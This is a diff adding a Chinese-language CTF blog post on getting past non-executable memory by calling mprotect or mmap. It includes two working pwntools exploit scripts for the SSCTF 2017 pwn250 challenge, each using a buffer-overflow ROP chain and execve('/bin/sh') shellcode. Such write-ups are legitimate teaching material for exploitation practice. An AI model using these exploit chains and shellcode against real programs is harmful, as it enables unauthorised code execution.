@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="">
+  <head>
+    <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="description" content="execute shellcode with mmap and mprotect"/>
+
+
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="WeeklyAlgo">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.1.0" />
+
+
+
+<link rel="canonical" href="http://weeklyalgo.codes/2017/05/07/execute shellcode with mmap and mprotect/"/>
+
+
+<meta name="description" content="利用mmap和mprotect来任意执行shellcode此前一直只了解了下原理，没有实际执行过，结果遇到题目后花时间去查它们的详细参数，因此这里记录总结下。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="execute shellcode with mmap and mprotect">
+<meta property="og:url" content="http://weeklyalgo.codes/2017/05/07/execute shellcode with mmap and mprotect/index.html">
+<meta property="og:site_name" content="WeeklyAlgo">
+<meta property="og:description" content="利用mmap和mprotect来任意执行shellcode此前一直只了解了下原理，没有实际执行过，结果遇到题目后花时间去查它们的详细参数，因此这里记录总结下。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://weeklyalgo.codes/images/execute%20shellcode%20with%20mmap%20and%20mprotect/mmap.png">
+<meta property="og:updated_time" content="2017-08-01T15:07:40.969Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="execute shellcode with mmap and mprotect">
+<meta name="twitter:description" content="利用mmap和mprotect来任意执行shellcode此前一直只了解了下原理，没有实际执行过，结果遇到题目后花时间去查它们的详细参数，因此这里记录总结下。">
+<meta name="twitter:image" content="http://weeklyalgo.codes/images/execute%20shellcode%20with%20mmap%20and%20mprotect/mmap.png">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.1.0" />
+
+
+
+  <link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css" />
+
+
+
+
+  
+
+
+
+    <title> execute shellcode with mmap and mprotect · WeeklyAlgo </title>
+  </head>
+
+  <body>
+    <div class="container">
+      <header id="header" class="header"><div class="logo-wrapper">
+  <a href="/." class="logo">WeeklyAlgo</a>
+</div>
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item">
+          <a class="menu-item-link" href="/">
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item">
+          <a class="menu-item-link" href="/archives/">
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item">
+          <a class="menu-item-link" href="/categories">
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item">
+          <a class="menu-item-link" href="/about">
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item">
+          <a class="menu-item-link" href="/flinks">
+            友链
+          </a>
+        </li>
+      
+      
+    </ul>
+  
+</nav>
+
+<div class="mobile-navbar">
+  <div class="mobile-header">
+    <div class="mobile-header-logo">
+      <a href="/." class="logo">WeeklyAlgo</a>
+    </div>
+
+    <div class="mobile-header-icon">
+      <span></span>
+      <span></span>
+      <span></span>
+    </div>
+  </div>
+  <nav class="mobile-menu">
+    
+      
+      <a class="mobile-menu-item" href="/">
+        首页
+      </a>
+    
+      
+      <a class="mobile-menu-item" href="/archives/">
+        归档
+      </a>
+    
+      
+      <a class="mobile-menu-item" href="/categories">
+        分类
+      </a>
+    
+      
+      <a class="mobile-menu-item" href="/about">
+        关于
+      </a>
+    
+      
+      <a class="mobile-menu-item" href="/flinks">
+        友链
+      </a>
+    
+  </nav>
+</div>
+      </header>
+
+      <main id="main" class="main">
+        <div class="content-wrapper">
+          <div id="content" class="content">
+            
+  
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          execute shellcode with mmap and mprotect
+        
+      </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2017年5月7日
+        </span>
+      </div>
+    </header>
+
+    
+      <div class="post-toc" id="post-toc">
+        <h2 class="post-toc-title">文章目录</h2>
+        <div class="post-toc-content">
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#利用mmap和mprotect来任意执行shellcode"><span class="toc-text">利用mmap和mprotect来任意执行shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#信息介绍"><span class="toc-text">信息介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#函数介绍"><span class="toc-text">函数介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mprotect"><span class="toc-text">. mprotect</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mmap"><span class="toc-text">. mmap</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用思路"><span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实例"><span class="toc-text">实例</span></a></li></ol></li></ol>
+        </div>
+      </div>
+    
+
+    <div class="post-content">
+      
+        <h1 id="利用mmap和mprotect来任意执行shellcode"><a href="#利用mmap和mprotect来任意执行shellcode" class="headerlink" title="利用mmap和mprotect来任意执行shellcode"></a>利用mmap和mprotect来任意执行shellcode</h1><p>此前一直只了解了下原理，没有实际执行过，结果遇到题目后花时间去查它们的详细参数，因此这里记录总结下。</p>
+<a id="more"></a>
+<blockquote>
+<ul>
+<li>by hook</li>
+</ul>
+</blockquote>
+<h2 id="信息介绍"><a href="#信息介绍" class="headerlink" title="信息介绍"></a>信息介绍</h2><p>现在程序基本都是开了对堆栈不可执行选项，但msf一堆优秀的shellcode不能拿来用是件多么痛苦的事情。<br>这里可以用mmap()或者mprotect函数来构造出我们须要权限的segment。</p>
+<h2 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h2><h3 id="mprotect"><a href="#mprotect" class="headerlink" title=". mprotect"></a><1>. mprotect</1></h3><p>int mprotect(const void *start, size_t len, int prot);<br>mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。</p>
+<h3 id="mmap"><a href="#mmap" class="headerlink" title=". mmap"></a><2>. mmap</2></h3><p>void<em> mmap(void</em> start,size_t length,int prot,int flags,int fd,off_t offset);<br>mmap()函数把指定或随机分配的地址内存，以prot权限映射到自start开始的，长度为length，而且为PAGE_SIZE单位的地址。</p>
+<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p><1>. 将shellcode写进一段具有可写权限的段里，然后用mprotect将对应的段修改为可执行，再跳到布置好的shellcode里。</1></p>
+<p><2>. 用mmap获取一段rwx权限的内存，映射到指定地址处，然后将shellcode写入映射好的内容存里，接着跳入布置好的shellcode中。</2></p>
+<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p><a href="https://github.com/gloxec/record/blob/master/ssctf_2017/pwn250" target="_blank" rel="external">ssctf-2017 pwn250</a><br>就拿这这个来练习下mprotect&amp;mmap:</p>
+<p>mprotect:</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"></div><div class="line">from pwn import *</div><div class="line"></div><div class="line">shellcode = <span class="string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"</span></div><div class="line">shellcode += <span class="string">"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"</span></div><div class="line">shellcode += <span class="string">"\x0b\xcd\x80"</span></div><div class="line"></div><div class="line">bssAddr = 0x080ec000</div><div class="line">mprotectAddr = 0x0806e070</div><div class="line">readAddr = 0x0806d510</div><div class="line"></div><div class="line">p = process('./250')</div><div class="line"><span class="comment">#p = remote('60.191.205.81', 2017)</span></div><div class="line">context.log_level = 'debug'</div><div class="line">p.recvuntil('Size]')</div><div class="line">p.sendline('102')</div><div class="line">p.recvuntil('Data]')</div><div class="line"></div><div class="line">pppr = 0x080ad715</div><div class="line"></div><div class="line">payload = 'a'*62+p32(mprotectAddr) + p32(pppr) + p32(bssAddr) + p32(0x1000) + p32(7)</div><div class="line">payload += p32(readAddr) + p32(bssAddr) + p32(0) + p32(bssAddr) + p32(len(shellcode)+1)</div><div class="line">p.send(payload)</div><div class="line">p.send(shellcode)</div><div class="line">p.recv()</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+<p>mmap:</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"></div><div class="line">from pwn import *</div><div class="line"></div><div class="line">shellcode = <span class="string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"</span></div><div class="line">shellcode += <span class="string">"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"</span></div><div class="line">shellcode += <span class="string">"\x0b\xcd\x80"</span></div><div class="line"></div><div class="line">segAddr = 0xbeef0000</div><div class="line">mmapAddr = 0x0806DF70 </div><div class="line">mainAddr = 0x08048886</div><div class="line">readAddr = 0x0806d510</div><div class="line"></div><div class="line">p = process('./250')</div><div class="line"><span class="comment">#p = remote('60.191.205.81', 2017)</span></div><div class="line">context.log_level = 'debug'</div><div class="line">context.terminal = ['tmux', 'splitw', '-h']</div><div class="line">p.recvuntil('Size]')</div><div class="line">p.sendline('94')</div><div class="line">p.recvuntil('Data]')</div><div class="line"></div><div class="line">payload = 'a'*62+p32(mmapAddr) + p32(mainAddr) + p32(segAddr) + p32(1024) + p32(7) + p32(34) + p32(0) + p32(0)</div><div class="line">p.send(payload)</div><div class="line"></div><div class="line">p.recvuntil('Size]')</div><div class="line"><span class="comment">#gdb.attach(p)</span></div><div class="line">p.sendline('82')</div><div class="line">p.recvuntil('Data]')</div><div class="line">payload2 = 'a'*62+p32(readAddr) + p32(segAddr) + p32(0) + p32(segAddr) + p32(1024)</div><div class="line">p.send(payload2)</div><div class="line">p.sendline(shellcode)</div><div class="line">p.recv()</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+<p>这里拿mmap后的内存看一下,可以发现被映射成rwx的内存和shellcode的成功执行。<br><img src="/images/execute shellcode with mmap and mprotect/mmap.png" alt=""></p>
+
+      
+    </div>
+
+    
+  </article>
+
+
+          </div>
+          
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="2017/05/07/execute shellcode with mmap and mprotect/"
+           data-title="execute shellcode with mmap and mprotect" data-url="http://weeklyalgo.codes/2017/05/07/execute shellcode with mmap and mprotect/">
+      </div>
+    
+  </div>
+
+        </div>  
+      </main>
+
+      <footer id="footer" class="footer">
+  <div class="social-links">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+        
+          <a href="https://github.com/weeklyalgo4groups" class="iconfont icon-github" title="github"></a>
+        
+      
+    
+      
+    
+      
+    
+    
+    
+  </div>
+
+
+<div class="copyright">
+  <span class="power-by">
+    由 <a class="hexo-link" href="https://hexo.io/">Hexo</a> 强力驱动
+  </span>
+  
+  <span class="theme-info">
+    主题 - 
+    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even">Even</a>
+  </span>
+
+  <span class="copyright-year">
+    
+    &copy; 
+    
+    2017
+
+    <span class="author">weeklyalgo.codes</span>
+  </span>
+</div>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"weeklyalgo"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+
+
+    
+  
+
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+    <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
+  
+
+    <script type="text/javascript" src="/js/src/even.js?v=2.1.0"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=2.1.0"></script>
+
+  </body>
+</html>
